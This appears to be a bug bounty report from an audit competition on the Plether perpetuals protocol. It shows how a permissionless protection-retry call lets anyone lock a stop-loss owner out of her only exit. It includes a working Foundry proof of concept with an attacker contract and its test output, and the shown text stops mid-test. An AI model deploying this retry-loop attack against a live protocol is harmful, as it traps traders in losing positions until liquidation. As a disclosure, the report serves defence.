# \#99779 [SC-High] Permissionless protection retry lets anyone block the owner's only exit from a failing triggered stop-loss

**Submitted on Nov 15th 2026 at 08:10:08 UTC by @songthuy307 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99779
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Once a take-profit/stop-loss protection has triggered, its owner can no longer cancel it, replace it, or commit a manual close: the account is trade-locked until the protected close executes. If that close fails on the owner's own close ceilings, the only remedy left to the owner is `amendLatchedPositionProtectionCloseLimits`, which is accepted only while the protection is `Latched` and the account has no pending order. `retryPositionProtectionClose` is permissionless and gives the owner no priority or delay. Any address can therefore terminalize the failing attempt and queue the next one in the same transaction, which leaves no point at which the owner's amendment can execute unless she wins a transaction-ordering race (see "Limits of the attack"). The owner stays in the position until the market comes back inside the stale ceilings or the account is liquidated. In the PoC an unprivileged address holds this lock for more than one hour with one cheap transaction per 60-second window and then liquidates the victim. A second test holds the lock for more than 24 hours.

Code reviewed at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` (in-scope freeze). Paths are relative to `packages/perps/`.

## Vulnerability Details

**1. After a trigger the owner has exactly one action.**

- `cancelPositionProtection` and `replacePositionProtection` accept only `PendingOpen` or `Armed` ([`PositionProtectionBook.sol:413-419`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L413-L419), [`PositionProtectionBook.sol:271-277`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L271-L277)).
- `cancelPositionProtectionAndCommitClose` accepts only `Armed` ([`PositionProtectionBook.sol:345-348`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L345-L348)). The team's response to Cecuro MED-30, which added this function, states: "Pending-open, Triggered and Latched records cannot use this action" (audit report p. 69).
- An ordinary `OrderRouter.commitOrder` reverts with `OrderRouter__ProtectionActive` while the account has any active protection ([`OrderLiquidationBatchLogic.sol:131-136`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L131-L136), [`OrderLiquidationBatchLogic.sol:313-315`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315)).
- The documentation says the same: "`Triggered` and `Latched` protection remain binding and cannot be cancelled or replaced" ([`WORKING_WITH_AI_AGENTS.md:288`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L288)) and "`Latched` means the trigger evidence and account trade lock remain" ([`SECURITY.md:547-548`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L547-L548)).

What remains is `amendLatchedPositionProtectionCloseLimits`, which requires the `Latched` status and zero pending Router orders for the account ([`PositionProtectionBook.sol:315-328`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328)).

**2. The owner needs that action whenever the close fails on the ceilings.**

The owner's four close ceilings are copied into the first protected close and into every retry ([`OrderLiquidationBatchLogic.sol:657-680`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680)). If execution would exceed one of them, the attempt fails with `ConstraintViolation` and the protection relatches ([`PositionProtectionBook.sol:662-667`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L662-L667)). The intended recovery is documented:

- "If a queued close fails and the protected side and size still match, protection becomes `Latched`; the owner may amend its limits before retrying." ([`WORKING_WITH_AI_AGENTS.md:283-284`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L283-L284))
- "The owner may amend the close ceilings of a `Latched` protection [...] when the account has no pending Router order. This changes the limits used for a future retry" ([`CANONICAL_ENTRYPOINTS.md:145-148`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L145-L148))
- The repository's own test expects that a "failed protected close must relatch for a trader-authorized retry" ([`PositionProtection.t.sol:947-951`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/trader/PositionProtection.t.sol#L947-L951)).

**3. Anyone can remove the `Latched` state before the owner can use it.**

`retryPositionProtectionClose` has no caller check. It requires only the `Latched` status, an unchanged position and no pending order ([`PositionProtectionBook.sol:382-406`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406)). It queues a new attempt and sets the status back to `Triggered` ([`PositionProtectionBook.sol:564-578`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578)), which makes both preconditions of the owner's amendment false. The failing attempt can also be terminalized by anyone, through `executeOrder` inside its oracle window or as an expiry after its deadline. One contract can therefore do both steps in a single transaction:

```solidity
router.executeOrder(childOrderId, pythUpdateData);          // attempt fails or expires -> Latched
protectionBook.retryPositionProtectionClose(protectionId);  // -> Triggered again, same stale ceilings
```

No transaction of the owner can execute between these two calls. Every new attempt carries the same ceilings, so it fails again. An attempt is executable only with an oracle tick from the 15 seconds after its commit (`orderSettlementWindow`, [`PletherOracle.sol:86-87`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L86-L87)) and expires after `maxExecutionWindowSeconds` (60 seconds by default, [`OrderExecutionOrchestrator.sol:10-14`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L10-L14)), so the caller needs at most one transaction per minute.

**4. Relation to earlier findings and documented limitations.**

The close ceilings and the amendment function were introduced by the fix for Cecuro MED-9 ("Keepers can retry protection closes without the trader's financial limits", audit report p. 27). The team's response describes the remedy this report shows to be deniable: "Only the owner may amend the retained ceilings while protection is Latched [...] Tight limits may prevent execution until conditions improve or the owner amends them." Before that fix a protected close used unlimited maxima and could not fail on a ceiling. The fix therefore added a state, a close that keeps failing on stale ceilings, whose only remedy any third party can block. This report is about that new behaviour, not about MED-9's original root cause.

The closest documented item is the "Router and keeper limitations" known-limitation bullet on protection retries ([`SECURITY.md:1356-1359`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1356-L1359)): "failed protection-attempt cleanup is deliberately unpaid; each retry creates a fresh zero-bounty close record [...] operators must alert on prolonged `Latched` state without a live child." That limitation is the **opposite** failure: a protection that stays `Latched` because nobody appends a retry, leaving the trader without the close they asked for. This report is not that case. Here a live attempt is always present (`Triggered`, not `Latched`), and its continuous presence is exactly what denies the owner the amendment the same docs promise. The accepted limitation is "too few retries"; this is "too many retries, by an adversary." `SECURITY.md` states that "Retry is permissionless" ([`SECURITY.md:550`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L550)) and that the owner may amend after a relatch, but nowhere states that a third party can keep the protection out of the `Latched` state and so withhold that amendment for as long as it keeps sending transactions. The AI scan finding "Protection trigger bounty is paid before a zero-bounty close is executed" is likewise about an attempt that no keeper finishes; it predates the amendment function and does not involve a third party denying it.

The deployment guide tells protection retry workers: "Investigate planner, constraint, or other persistent failures before retrying; do not continuously queue the same failing attempt" ([`DEPLOYMENT.md:419-421`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L419-L421)). `SECURITY.md` likewise describes keepers "processing the terminal attempt and separately appending a retry" ([`SECURITY.md:1357-1358`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1357-L1358)). The attack is exactly the behaviour these documents tell keepers to avoid: it re-queues an attempt that keeps failing on a constraint, in the same transaction that terminalizes it. Nothing in the contracts prevents this, and the program treats keepers as untrusted and asks researchers to consider "any contract-permitted behavior, including deviations from the reference implementation".

Cecuro MED-15 ("Triggered SHORT protection can get stuck and leave a user unprotected", audit report pp. 39-40) has a similar symptom: a protected close that fails, relatches and fails again on every retry. Its root cause is different. There, the `targetPrice = 1` sentinel used for SHORT protection closes meets an execution price of zero, and the team addressed it by rejecting zero prices. The loop in this report needs no zero price: the PoC uses a LONG position at a positive price, and every attempt fails because the owner's own ceilings are exceeded. The harm is also different: not that no valid quote exists, but that a third party withholds the amendment the owner is documented to have.

**Limits of the attack.**

- It affects protections with finite close ceilings while the market is beyond one of them, for example a stop-loss that gapped through the owner's notional or gross-debit ceiling. Finite ceilings are the documented norm, not an edge case: a protection "must explicitly supply" its close limits, set "from the trader's intended close policy; integrations must not assume an implicit unlimited default", and `type(uint256).max` is "an explicit unlimited allowance" ([`CANONICAL_ENTRYPOINTS.md:121-125`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L121-L125)). Opting into unlimited ceilings would bring back the exposure that MED-9 removed.
- If the price returns inside the ceilings, the queued attempt executes and the position closes as originally authorized.
- The owner escapes only if, once the attempt is terminalized, her amendment lands before any retry: the protection is `Latched` only between the terminalizing call and the next `retryPositionProtectionClose`, which anyone can send. An owner using a plain EOA, as in the PoC, needs two transactions (terminalize, then amend), and a retry that lands between them puts her back where she started.
- Plether's supported trading accounts are SimpleAccount v0.8 smart accounts ([`DEPLOYMENT.md:425-432`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L425-L432)), whose owner can batch the two calls into one. For any owner, the lock is therefore not absolute: it is a transaction-ordering race at each execution deadline, and the attacker has to win every race while the owner has to win one. To win it she must run her own low-latency automation that watches every 60-second deadline, which is exactly what a stop-loss is meant to make unnecessary. Until she wins, she stays locked in the position and exposed to the market, and an owner without such automation stays locked for as long as the attacker continues.

## Impact Details

Selected impact: **Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)** (Medium).

This matches Immunefi's definition of Griefing: the attacker calls a function (`retryPositionProtectionClose`) that keeps the contract in a state which blocks the normal execution of another user's function (`amendLatchedPositionProtectionCloseLimits`). I selected Griefing rather than a freezing impact because the lock is sustained by one transaction per minute, not by a single transaction. The PoC nevertheless shows the position and its margin locked for more than one hour, which is the threshold of the program's other Medium impact, "Temporary freezing of funds for at least 1 hour".

While the lock holds, the owner cannot close the position or withdraw its margin. She can only add margin. The lock costs the caller one small transaction per minute on Arbitrum and needs no capital and no privileged role. The damage is not limited to failed transactions: the victim is kept in a losing position, and in the PoC she ends in a liquidation that costs her 791.52 USDG more than the exit she was entitled to request. The caller can also perform that liquidation itself and collect the liquidation bounty.

Numbers from the PoC (Alice: LONG 10,000 USDG notional, 2,000 USDG margin, stop-loss at 1.10, notional ceiling 0.5% above the trigger-level notional; the market gaps to 1.12):

- Without interference Alice raises her ceiling and exits at 1.12 with a settlement balance of 18,791.32 USDG.
- With the attack she is locked for 3,663 seconds by 63 attacker transactions. Every exit she has reverts throughout. The price then reaches 1.50 and the attacker liquidates her: her balance is 17,999.80 USDG, 791.52 USDG less than in the control run, and the attacker receives a 5.00 USDG liquidation bounty.
- A second test holds the same lock for 86,498 seconds (more than 24 hours) with 1,418 transactions. The duration is limited only by how long the caller keeps sending transactions.

The PoC uses large, round price moves so that the effect shows in round numbers. The lock itself does not depend on the size of the move: it only requires the price to stay beyond one of the owner's ceilings. The additional loss scales with the size and leverage of the position.

The program states that keepers are not trusted and that "harm caused by any caller acting as a keeper is in scope".

## References

- Owner actions blocked after a trigger: [`PositionProtectionBook.sol:413-419`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L413-L419), [`PositionProtectionBook.sol:271-277`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L271-L277), [`PositionProtectionBook.sol:345-348`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L345-L348), [`OrderLiquidationBatchLogic.sol:313-315`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315).
- Owner amendment: [`PositionProtectionBook.sol:315-328`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328). Permissionless retry: [`PositionProtectionBook.sol:382-406`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406), [`PositionProtectionBook.sol:564-578`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578). Relatch on failure: [`PositionProtectionBook.sol:662-667`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L662-L667).
- Ceilings copied into every attempt: [`OrderLiquidationBatchLogic.sol:657-680`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680).
- Documentation: [`WORKING_WITH_AI_AGENTS.md:283-284`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L283-L284), [`WORKING_WITH_AI_AGENTS.md:288`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L288), [`CANONICAL_ENTRYPOINTS.md:121-125`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L121-L125), [`CANONICAL_ENTRYPOINTS.md:142-148`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L142-L148), [`SECURITY.md:547-552`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L547-L552), [`SECURITY.md:1356-1359`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1356-L1359), [`DEPLOYMENT.md:419-421`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L419-L421), [`DEPLOYMENT.md:425-432`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L425-L432).
- Cecuro AI audit, MED-9 and the team response: [`audits/plether-ai-audit-report-2026-10-26.pdf`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf), pp. 27-28.

## Recommendation

Any one of the following closes the gap:

- Accept `amendLatchedPositionProtectionCloseLimits` while the protection is `Triggered` as well, storing the new ceilings for the next attempt. The attempt already queued keeps the bounds it was registered with.
- Give the owner an exclusive window after each relatch, for example by allowing only the owner to call `retryPositionProtectionClose` for a fixed number of seconds.
- Let the owner of a `Latched` or `Triggered` protection replace it with a caller-authored close, as `cancelPositionProtectionAndCommitClose` already does for `Armed` protections.


## Proof of Concept

Runs in the repository's own Foundry suite at the in-scope commit. The PoC contract inherits the repository's `PositionProtectionTest` (`packages/perps/test/perps/spec/trader/PositionProtection.t.sol`) to reuse its fixtures and helpers. `BasePerpTest` deploys the production contracts with mocked Pyth updates and mock USDG only, which the rules allow because both are out of scope. No contract in scope is modified. The fixture helper `_open` creates Alice's position; everything after that uses production entrypoints only: `createPositionProtection`, `triggerPositionProtection`, `executeOrder`, `retryPositionProtectionClose`, `amendLatchedPositionProtectionCloseLimits`, `cancelPositionProtection`, `replacePositionProtection`, `cancelPositionProtectionAndCommitClose`, the V3 `commitOrder(OrderRequest)` and `executeLiquidation`.

Save the file below as `packages/perps/test/perps/spec/trader/ProtectionRetryLockoutPoc.t.sol` and run:

```bash
cd packages/perps
forge test --match-path test/perps/spec/trader/ProtectionRetryLockoutPoc.t.sol --match-contract ProtectionRetryLockoutPocTest --match-test "test_(Control|Poc)_" --gas-limit 100000000000 -vv
```

`--match-test` selects the three PoC tests, because the contract also inherits the repository's own protection tests. `--gas-limit` is needed only by the 24-hour test, whose 1,418 loop iterations exceed Forge's default per-test gas limit. It does not change any contract behaviour.

Actors: Alice `0xA11CE` (trader, 20,000 USDG), the attacker `0xBAD1` (no funds, no role) and its helper contract `RetryLocker`, which calls `executeOrder` and `retryPositionProtectionClose` in one transaction. Alice opens LONG 10,000 USDG notional with 2,000 USDG margin at 1.00 and arms a stop-loss at 1.10 whose notional ceiling is the trigger-level notional plus 0.5% (11,055 USDG). The market gaps to 1.12, where the close needs 11,200 USDG of notional.

1. `test_Control_OwnerAmendsLatchedLimitsAndExits`: the protected close fails with `ConstraintViolation`, the protection becomes `Latched`, Alice raises her ceilings and the next retry closes the position at 1.12. This is the documented recovery.
2. `test_Poc_PermissionlessRetryLocksOwnerOutUntilLiquidation`: the attacker re-queues the failing attempt in the same transaction that terminalizes it. In the first three cycles the attempt is executed at 1.12 and fails on Alice's ceiling. After that the attacker sends one transaction per 60-second window. Throughout, all five of Alice's exits revert: amend (`ProtectionNotLatched`), cancel, replace and cancel-and-close (`ProtectionNotArmed`), and a valid V3 full close (`ProtectionActive`). After 3,663 seconds the price reaches 1.50 and the attacker liquidates Alice.
3. `test_Poc_LockoutCanBeSustainedFor24Hours`: the same lock held for 86,498 seconds with 1,418 attacker transactions.

Output:

```
Ran 3 tests for test/perps/spec/trader/ProtectionRetryLockoutPoc.t.sol:ProtectionRetryLockoutPocTest
[PASS] test_Control_OwnerAmendsLatchedLimitsAndExits() (gas: 3954232)
Logs:
  control: Alice settlement balance after exiting at 1.12: 18791.320000
[PASS] test_Poc_LockoutCanBeSustainedFor24Hours() (gas: 1087784634)
Logs:
  attacker transactions: 1418
  seconds Alice has been locked out: 86498
[PASS] test_Poc_PermissionlessRetryLocksOwnerOutUntilLiquidation() (gas: 61348810)
Logs:
  attacker transactions: 63
  seconds Alice has been locked out: 3663
  Alice settlement balance when the stop triggered: 19996.000000
  attack: Alice settlement balance after liquidation: 17999.800000
  attacker liquidation bounty: 5.000000
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.07s (1.16s CPU time)
Ran 1 test suite in 1.08s (1.07s CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

PoC file:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @notice Unprivileged helper. In ONE transaction it terminalizes the current (failing) protection close attempt
///         and immediately queues the next one, so the protection is never observable as `Latched` by its owner.
contract RetryLocker {

    function cycle(
        address router,
        address protectionBook,
        uint64 childOrderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 nextChildOrderId) {
        result = IPerpsKeeper(router).executeOrder(childOrderId, pythUpdateData);
        nextChildOrderId = IPositionProtectionActions(protectionBook).retryPositionProtectionClose(protectionId);
    }

}

/// @notice PoC: a permissionless `retryPositionProtectionClose` denies the owner's only exit from a failing
///         (latched) stop-loss. Reuses the repository's own PositionProtection fixtures and helpers.
contract ProtectionRetryLockoutPocTest is PositionProtectionTest {

    address internal constant ATTACKER = address(0xBAD1);
    /// @dev The market gaps through Alice's 1.10 stop-loss and trades at 1.12.
    uint256 internal constant GAP_PRICE = 112_000_000;

    RetryLocker internal locker;

    /// @dev Alice: LONG 10,000 notional with 2,000 margin, stop-loss at 1.10. She authorizes the protected close for
    ///      at most the trigger-level notional plus 0.5% (a finite ceiling, as the V3 bounds model intends).
    function _armAliceStopLoss()
        internal
        returns (uint64 protectionId, PositionProtectionTypes.CloseFinancialLimits memory limits)
    {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        uint256 triggerNotionalAssets = (POSITION_SIZE * LONG_STOP_LOSS) / 1e20;
        params.closeLimits.maxExecutionNotionalAssets = (triggerNotionalAssets * 1005) / 1000;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
        limits = params.closeLimits;
    }

    function _relaxedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    /// @dev Every exit Alice has while the protection is `Triggered` reverts.
    function _assertAliceHasNoExit(
        uint64 protectionId
    ) internal {
        // Build arguments first: view calls made while encoding them would otherwise consume expectRevert.
        PositionProtectionTypes.CloseFinancialLimits memory relaxed = _relaxedLimits();
        PositionProtectionTypes.PositionProtectionParams memory replacement = _params(0, LONG_STOP_LOSS + 1);
        OrderV3Types.OrderRequest memory manualClose = _publicBoundedRequest(bytes32(uint256(0xA11CE)), true);
        manualClose.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        manualClose.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());

        vm.startPrank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, relaxed);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.replacePositionProtection(protectionId, replacement);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualClose);
        // An ordinary, fully valid V3 full-close request through the production entrypoint.
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(manualClose);
        vm.stopPrank();
    }

    /// @notice Control: without interference the documented remedy works. The close fails on Alice's ceiling, the
    ///         protection relatches, Alice raises the ceiling and the next retry closes her position at 1.12.
    function test_Control_OwnerAmendsLatchedLimitsAndExits() public {
        (uint64 protectionId,) = _armAliceStopLoss();
        uint64 childOrderId = _triggerAt(protectionId, GAP_PRICE);

        bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(childOrderId, executionData);
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "close must fail on the notional ceiling"
        );
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());
        vm.prank(ALICE);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);

        executionData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        result = router.executeOrder(retryOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry must execute");
        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "Alice exits at 1.12");
        emit log_named_decimal_uint(
            "control: Alice settlement balance after exiting at 1.12", clearinghouse.balanceAssets(ALICE), 6
        );
    }

    /// @notice Attack: an unprivileged caller re-queues the failing attempt in the same transaction that terminalizes
    ///         it. For more than one hour Alice cannot amend, cancel, replace or manually close; she stays in the
    ///         position until it is liquidated, and the attacker collects the liquidation bounty.
    function test_Poc_PermissionlessRetryLocksOwnerOutUntilLiquidation() public {
        locker = new RetryLocker();
        (uint64 protectionId, PositionProtectionTypes.CloseFinancialLimits memory limits) = _armAliceStopLoss();
        uint256 aliceBalanceAtTrigger = clearinghouse.balanceAssets(ALICE);
        uint64 childOrderId = _triggerAt(protectionId, GAP_PRICE);
        // vm.getBlockTimestamp(): the optimizer treats block.timestamp as constant inside one test transaction.
        uint256 lockStart = vm.getBlockTimestamp();

        // Alice is already locked while the first attempt is live.
        _assertAliceHasNoExit(protectionId);

        uint256 cycles;
        OrderV3Types.ExecutionResult memory result;
        uint64 nextChildOrderId;

        // Phase 1: the attempt is executed inside its oracle window with a post-commit tick at 1.12. It fails on
        // Alice's own ceiling, and the same transaction queues the next attempt.
        for (uint256 i; i < 3; ++i) {
            bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE);
            vm.prank(ATTACKER);
            (result, nextChildOrderId) =
                locker.cycle(address(router), address(protectionBook), childOrderId, protectionId, executionData);
            assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "attempt must fail");
            assertEq(
                uint8(result.terminalReason),
                uint8(OrderV3Types.TerminalReason.ConstraintViolation),
                "attempt must fail on the notional ceiling"
            );
            // A new attempt with the SAME ceilings is already live, so Alice never observes `Latched`.
            assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            _assertPendingCloseLimits(nextChildOrderId, limits);
            _assertAliceHasNoExit(protectionId);
            childOrderId = nextChildOrderId;
            ++cycles;
        }

        // Phase 2: the attacker needs one transaction per 60 s execution window. Each one terminalizes the expired
        // attempt and re-queues it atomically. Alice is checked before and after every attacker transaction.
        while (vm.getBlockTimestamp() < lockStart + 1 hours + 60) {
            uint64 deadline = router.lifecycleBook().orderTiming(childOrderId).executionDeadline;
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(deadline) + 1);
            _assertAliceHasNoExit(protectionId);

            vm.prank(ATTACKER);
            (result, nextChildOrderId) =
                locker.cycle(address(router), address(protectionBook), childOrderId, protectionId, new bytes[](0));
            assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Expired), "attempt expired");
            assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            _assertPendingCloseLimits(nextChildOrderId, limits);
            _assertAliceHasNoExit(protectionId);
            childOrderId = nextChildOrderId;
            ++cycles;
        }

        (uint256 sizeWhileLocked,,,,,,) = engine.positions(ALICE);
        assertEq(sizeWhileLocked, POSITION_SIZE, "Alice is still in the full position");
        emit log_named_uint("attacker transactions", cycles);
        emit log_named_uint("seconds Alice has been locked out", vm.getBlockTimestamp() - lockStart);
        assertGt(vm.getBlockTimestamp() - lockStart, 1 hours, "lockout exceeds one hour");

        // The price keeps moving against Alice. She never got to exit; the attacker liquidates her.
        _mockPythUpdateData(150_000_000);
        bytes[] memory liquidationData = _livePriceData(150_000_000);
        uint256 attackerBefore = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        router.executeLiquidation(ALICE, liquidationData);

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "Alice was liquidated");
        assertEq(
            uint8(_status(protectionId)),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated),
            "protection ends as Liquidated"
        );
        assertGt(clearinghouse.balanceAssets(ATTACKER), attackerBefore, "attacker earned the liquidation bounty");
